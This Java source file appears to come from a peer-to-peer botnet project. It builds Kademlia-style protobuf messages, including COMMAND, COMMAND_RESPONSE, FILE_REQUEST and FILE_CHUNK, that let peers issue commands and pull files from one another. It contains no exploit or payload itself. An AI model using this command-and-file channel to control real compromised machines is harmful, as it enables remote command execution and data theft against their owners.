package botnet_p2p.protobuf_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.model.Peer;

import java.math.BigInteger;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import java.util.stream.Collectors;

import static botnet_p2p.MessageOuterClass.Message;


public class Protobuf {
    public static Message.Builder createBaseMessage(KademliaPeer sender, Peer receiver) {
        Message.Contact senderContact = kademliaPeerToContact(sender);

        Message.Contact receiverContact = Message.Contact.newBuilder()
                //.setGuid(receiver.getGuid()) //  peer - no guid
                .setIP(receiver.getAddress())
                .setIsNAT(false)
                .setPort(receiver.getPort())
                .build();

        return Message.newBuilder()
                .setSender(senderContact)
                .setReceiver(receiverContact)
                .setUuid(new BigInteger(64, new Random()).toString());
    }

    public static Message.Builder createBaseMessage(KademliaPeer sender, KademliaPeer receiver) {
        Message.Contact senderContact = kademliaPeerToContact(sender);
        Message.Contact receiverContact = kademliaPeerToContact(receiver);

        return Message.newBuilder()
                .setSender(senderContact)
                .setReceiver(receiverContact)
                .setPropagate(false)
                .setUuid(UUID.randomUUID().toString());
    }

    public static Message createFindNodeMessage(Peer bootstrapNode, KademliaPeer me) {
        return createBaseMessage(me, bootstrapNode)
                .setType(Message.MessageType.FIND_NODE)
                .setFindNode(
                        Message.FindNodeMsg.newBuilder()
                                .setGuid(me.getGuid())
                )
                .build();
    }

    public static Message createPingMessage(KademliaPeer destination, KademliaPeer me, boolean propagate) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.PING)
                .setPropagate(propagate)
                .build();
    }

    public static Message createPingResponseMessage(KademliaPeer destination, KademliaPeer me) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.PING_RESPONSE)
                .build();
    }

    public static Message createFoundNodesMessage(KademliaPeer destination,
                                                  KademliaPeer me,
                                                  List<KademliaPeer> nearestPeers) {

        Message.FoundNodesMsg foundNodes = Message.FoundNodesMsg.newBuilder()
                .addAllNodes(nearestPeers
                        .stream()
                        .map(Protobuf::kademliaPeerToContact)
                        .collect(Collectors.toList())).build();

        return createBaseMessage(me, destination)
                .setType(Message.MessageType.FOUND_NODES)
                .setFoundNodes(foundNodes)
                .build();
    }

    public static Message createLeaveMessage(KademliaPeer sender, KademliaPeer destination) {
        return createBaseMessage(sender, destination)
                .setType(Message.MessageType.LEAVE)
                .build();
    }

    public static Message createCommandReponseMessage(KademliaPeer destination,
                                                      KademliaPeer me,
                                                      String response,
                                                      boolean success,
                                                      String command) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.COMMAND_RESPONSE)
                .setResponse(
                        Message.CommandResponseMsg.newBuilder()
                                .setValue(response)
                                .setStatus(success ? Message.Status.OK : Message.Status.FAIL)
                                .setCommand(command)
                                .build())
                .build();
    }

    public static Message createFileChunkMessage(KademliaPeer destination,
                                                 KademliaPeer me,
                                                 Message.FileChunkMsg fileChunk) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.FILE_CHUNK)
                .setFileChunk(fileChunk)
                .build();
    }

    public static Message createCommandMessage(KademliaPeer destination, KademliaPeer me, String command) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.COMMAND)
                .setCommand(
                        Message.CommandMsg.newBuilder()
                                .setCommand(command)
                                .setShouldRespond(true)
                                .build()
                )
                .build();
    }

    public static Message createFileRequestMessage(KademliaPeer destination, KademliaPeer me, String path) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.FILE_REQUEST)
                .setFileRequest(
                        Message.FileRequestMsg.newBuilder()
                                .setPath(path)
                                .build()
                ).build();
    }

    private static Message.Contact kademliaPeerToContact(KademliaPeer peer) {
        return Message.Contact.newBuilder()
                .setGuid(peer.getGuid())
                .setIP(peer.getHost())
                .setIsNAT(false) // TODO
                .setPort(peer.getPort())
                .build();
    }
}
